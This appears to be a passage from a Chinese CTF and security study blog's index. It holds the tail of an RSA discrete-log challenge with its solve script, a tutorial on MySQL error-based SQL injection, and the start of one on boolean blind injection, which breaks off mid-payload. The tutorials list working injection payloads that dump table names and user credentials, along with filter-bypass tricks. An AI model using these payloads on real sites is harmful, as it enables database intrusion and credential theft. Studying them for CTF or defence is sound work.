operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token keyword">assert</span> m<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">47</span>data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span>cs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p<span class="token operator">*</span>q<span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>    cs<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>cs<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""[183098212086317720236828757315510192339273033804875740822801041376722387458993552796227899411901966324318366514880536763913315608412750265815750386810801443666072579873995967676472994916617708760086271155827496223499121301339946900578686321571238854410077055150282805741312173826325669295346629270100887114, 57033027040944100515577298747833062983449034346155581535109171399667991971614122726451624246276583123688811765412755210627513537740891720491136798691017567675611749056264437247135506921747135448387155606513983563110678466501221603978172670533058510913876368172674768929417846635764813733749021238273031358064, 44177513422937659688192503808032734159830361147993789424022745838993946766432456884886189398779755202878679629523667923807343226973440318127947558457476925179848208108399587026072741947465486816791306581859876197942191253278120326733144030253277598039138046967591357892542649422324554104602547660747339872074, 12631302718057472129138289484187738038805661685759196779990368768599115569927115234126312113575785471158626604808250556471019475882601443785660157133230999298014824293609691681149195181799904358979944719852988436666306120350671288382565369084160416022015445829639878167524217607450918100132212115997395372780, 42899381454706854217031716361682990989382003331688973566655317536112884234898037025883907894505663567670829738793956574655657437562098921910867502135260835097785409348930680677890714703165271668372795217905436049326872168290466249129739381681341323649536725632009485619857375114283009023943744880775769510652]"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="脚本-3"><a href="#脚本-3" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>c2<span class="token punctuation">,</span>c3<span class="token punctuation">,</span>c4<span class="token punctuation">,</span>c5<span class="token punctuation">,</span>c6 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">183098212086317720236828757315510192339273033804875740822801041376722387458993552796227899411901966324318366514880536763913315608412750265815750386810801443666072579873995967676472994916617708760086271155827496223499121301339946900578686321571238854410077055150282805741312173826325669295346629270100887114</span><span class="token punctuation">,</span> <span class="token number">57033027040944100515577298747833062983449034346155581535109171399667991971614122726451624246276583123688811765412755210627513537740891720491136798691017567675611749056264437247135506921747135448387155606513983563110678466501221603978172670533058510913876368172674768929417846635764813733749021238273031358064</span><span class="token punctuation">,</span> <span class="token number">44177513422937659688192503808032734159830361147993789424022745838993946766432456884886189398779755202878679629523667923807343226973440318127947558457476925179848208108399587026072741947465486816791306581859876197942191253278120326733144030253277598039138046967591357892542649422324554104602547660747339872074</span><span class="token punctuation">,</span> <span class="token number">12631302718057472129138289484187738038805661685759196779990368768599115569927115234126312113575785471158626604808250556471019475882601443785660157133230999298014824293609691681149195181799904358979944719852988436666306120350671288382565369084160416022015445829639878167524217607450918100132212115997395372780</span><span class="token punctuation">,</span> <span class="token number">42899381454706854217031716361682990989382003331688973566655317536112884234898037025883907894505663567670829738793956574655657437562098921910867502135260835097785409348930680677890714703165271668372795217905436049326872168290466249129739381681341323649536725632009485619857375114283009023943744880775769510652</span><span class="token punctuation">]</span>data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span>n <span class="token operator">=</span> gcd<span class="token punctuation">(</span><span class="token punctuation">[</span>c2<span class="token operator">**</span><span class="token number">2</span><span class="token operator">-</span>c4<span class="token punctuation">,</span> c2<span class="token operator">*</span>c3<span class="token operator">-</span>c6<span class="token punctuation">,</span> c2<span class="token operator">*</span>c6<span class="token operator">-</span>c3<span class="token operator">*</span>c4<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> n<span class="token operator">%</span>i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>        n <span class="token operator">//=</span> i<span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token comment"># assert m.bit_length() == 47</span>m <span class="token operator">=</span> discrete_log_lambda<span class="token punctuation">(</span>Mod<span class="token punctuation">(</span>c2<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">,</span> Mod<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">,</span> bounds<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span><span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">^</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">b'flag&#123;'</span> <span class="token operator">+</span> long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'&#125;'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> match </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 黄河流域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>报错注入</title>
      <link href="/2023/02/02/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/02/02/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="1-报错注入的介绍"><a href="#1-报错注入的介绍" class="headerlink" title="1.报错注入的介绍"></a>1.报错注入的介绍</h3><p>SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用。</p><h4 id="报错注入分类"><a href="#报错注入分类" class="headerlink" title="报错注入分类"></a>报错注入分类</h4><p>MySQL的报错注入主要是利用MySQL的一些逻辑漏洞，根据漏洞原因的不同，可以将MySQL报错注入 分为以下几类：</p><ul><li>BigInt等数据类型溢出   <a href="https://www.cnblogs.com/lcamry/articles/5509112.html"></a></li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>xpath语法错误    xpath报错最多只能报出32位字符  所以要使用字符截取函数</p></li><li><p>count()+rand()+group_by()导致主键重复 </p></li><li><p>空间数据类型函数错误</p></li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> NAME_CONST<span class="token punctuation">(</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>NAME_CONST<span class="token punctuation">(</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-报错注入的攻击流程"><a href="#2-报错注入的攻击流程" class="headerlink" title="2.报错注入的攻击流程"></a>2.报错注入的攻击流程</h3><h4 id="1-判断注入类型"><a href="#1-判断注入类型" class="headerlink" title="1.判断注入类型"></a>1.判断注入类型</h4><p>先判断是字符型还是数字型</p><h4 id="2-获取数据库名称"><a href="#2-获取数据库名称" class="headerlink" title="2.获取数据库名称"></a>2.获取数据库名称</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-获取数据库表名"><a href="#3-获取数据库表名" class="headerlink" title="3.获取数据库表名"></a>3.获取数据库表名</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='</span>security'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-获取字段名"><a href="#4-获取字段名" class="headerlink" title="4.获取字段名"></a>4.获取字段名</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='</span>users<span class="token string">' and table_schema='</span>security'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> union select (exp(~(select * FROM(SELECT USER())a))),2, 3–+</p><h4 id="5-获取字段内容"><a href="#5-获取字段内容" class="headerlink" title="5.获取字段内容"></a>5.获取字段内容</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-报错注入的一些函数"><a href="#3-报错注入的一些函数" class="headerlink" title="3.报错注入的一些函数"></a>3.报错注入的一些函数</h3><h4 id="1-Updatexml"><a href="#1-Updatexml" class="headerlink" title="1.Updatexml()"></a>1.Updatexml()</h4><pre class="line-numbers language-none"><code class="language-none">函数语法：updatexml(XML_document, XPath_string, new_value);适用版本: 5.1.5+我们通常在第二个xpath参数填写我们要查询的内容。updatexml是由于参数的格式不正确而产生的错误，同样也会返回参数 的信息。payload: updatexml(1,concat(0x7e,(select user()),0x7e),1)前后添加~使其不符合xpath格式从而报错。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-extractvalue"><a href="#2-extractvalue" class="headerlink" title="2.extractvalue()"></a>2.extractvalue()</h4><pre class="line-numbers language-none"><code class="language-none">函数语法：EXTRACTVALUE (XML_document, XPath_string);适用版本：5.1.5+利用原理与updatexml函数相同payload: extractvalue(1,concat(0x7e,(select user()),0x7e))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-floor"><a href="#3-floor" class="headerlink" title="3.floor()"></a>3.floor()</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> concat<span class="token punctuation">(</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果关键的表被禁用了，可以使用这种形式 </p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">group</span> <span class="token keyword">by</span> concat<span class="token punctuation">(</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果 rand 被禁用了可以使用用户变量来报错 </p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">min</span><span class="token punctuation">(</span><span class="token variable">@a</span>:<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> concat<span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token variable">@a</span>:<span class="token operator">=</span><span class="token punctuation">(</span><span class="token variable">@a</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-exp"><a href="#4-exp" class="headerlink" title="4.exp"></a>4.exp</h4><p><a href="https://www.cnblogs.com/lcamry/articles/5509124.html">exp</a></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> exp<span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> exp<span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> exp<span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">''</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="5-geometrycollection"><a href="#5-geometrycollection" class="headerlink" title="5.geometrycollection()"></a>5.geometrycollection()</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">geometrycollection</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="6-multipoint"><a href="#6-multipoint" class="headerlink" title="6.multipoint()"></a>6.multipoint()</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">multipoint</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="7-polygon"><a href="#7-polygon" class="headerlink" title="7.polygon"></a>7.polygon</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">polygon</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="8-multipolygon"><a href="#8-multipolygon" class="headerlink" title="8.multipolygon"></a>8.multipolygon</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">multipolygon</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="9-linestring"><a href="#9-linestring" class="headerlink" title="9.linestring"></a>9.linestring</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">linestring</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="10-multilinestring"><a href="#10-multilinestring" class="headerlink" title="10.multilinestring"></a>10.multilinestring</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">multilinestring</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> Sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 报错注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>盲注</title>
      <link href="/2023/02/02/%E7%9B%B2%E6%B3%A8/"/>
      <url>/2023/02/02/%E7%9B%B2%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><h4 id="1-布尔盲注的判断"><a href="#1-布尔盲注的判断" class="headerlink" title="1.布尔盲注的判断"></a>1.布尔盲注的判断</h4><pre class="line-numbers language-none"><code class="language-none">布尔状态例如：1.回显不同（内容、长度）2.HTTP响应状态码不同（200、500）3.HTTP响应头变化（无条件重定向、设置cookie）4.基于错误的布尔注入（MySQL是否报错）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有些时候很多东西都被过滤了，如果一个一个的尝试的话会非常麻烦并且费时费力，可以尝试FUZZ黑名单过滤，利用burpsuite   intruder模块</p><p>先传入一个参数然后抓包，加一个变量利用intruder模块爆破sql语句关键字就可以了</p><h4 id="2-布尔盲注攻击流程"><a href="#2-布尔盲注攻击流程" class="headerlink" title="2.布尔盲注攻击流程"></a>2.布尔盲注攻击流程</h4><h5 id="1-判断是否存在注入"><a href="#1-判断是否存在注入" class="headerlink" title="1.判断是否存在注入"></a>1.判断是否存在注入</h5><pre class="line-numbers language-none"><code class="language-none">第一步：正常查询，返回True（语句执行成功）或者返回False（语句执行成功没有查询到内容）。第二步：输入引号进行看页面变化，页面返回False，可能存在漏洞，也可能没有查询到内容。第三步：利用and进行判断，比如：1 and 1&#x3D;1和1 and 1&#x3D;2，1’ and 1&#x3D;1#和1’ and 1&#x3D;2#，如果前者执行的结果不一样，说明是数字型的布尔盲注；如果后者执行的结果不一样，说明是字符型的布尔盲注。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="2-获取数据库长度"><a href="#2-获取数据库长度" class="headerlink" title="2.获取数据库长度"></a>2.获取数据库长度</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">因为无法通过页面数据回显获取数据，所以只能靠判断对错的方式来获取数据，可以使用MySQL中的内置函数获取字符串长度：length<span class="token punctuation">(</span><span class="token punctuation">)</span> ：单位是字节，utf8编码下<span class="token punctuation">,</span>一个汉字三个字节，一个数字或字母一个字节。gbk编码下<span class="token punctuation">,</span>一个汉字两个字节，一个数字或字母一个字节。char_length<span class="token punctuation">(</span><span class="token punctuation">)</span>：单位为字符，不管汉字还是数字或者是字母都算是一个字符。比如：<span class="token keyword">select</span> length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">select</span> length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">;</span>   <span class="token comment">#利用这种方式赋值  当赋值正确时会返回正确也可以通过脚本来爆破</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="3-逐字猜解数据库名"><a href="#3-逐字猜解数据库名" class="headerlink" title="3.逐字猜解数据库名"></a>3.逐字猜解数据库名</h5><pre class="line-numbers language-none"><code class="language-none">在获取数据库名的时候注意数据库的命名规则，他是采用26个英文字母(区分大小写)和0-9的自然数(经常不需要)加上下划线&#39;_&#39;组成，命名简洁明确，多个单词用下划线&#39;_&#39;分隔。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">利用substr字符串截取函数来逐个判断substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'s'</span>如果substr函数被过滤可以使用  <span class="token function">mid</span><span class="token punctuation">(</span><span class="token punctuation">)</span>函数来替代也可以把截取的东西转化为ASCII值来判断ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">115</span>爆破过程可以利用burpsuite   intruder  模块进行爆破过滤了逗号怎么办？就不能多个参数了吗？利用   <span class="token keyword">from</span>   和    <span class="token keyword">for</span>  代替<span class="token keyword">SELECT</span> SUBSTR<span class="token punctuation">(</span><span class="token string">'2018-08-17'</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>与<span class="token keyword">SELECT</span> SUBSTR<span class="token punctuation">(</span><span class="token string">'2018-08-17'</span> <span class="token keyword">FROM</span> <span class="token number">6</span> <span class="token keyword">FOR</span> <span class="token number">5</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="4-逐字猜解数据库的表名"><a href="#4-逐字猜解数据库的表名" class="headerlink" title="4.逐字猜解数据库的表名"></a>4.逐字猜解数据库的表名</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="5-逐字猜解字段名"><a href="#5-逐字猜解字段名" class="headerlink" title="5.逐字猜解字段名"></a>5.逐字猜解字段名</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">select</span> 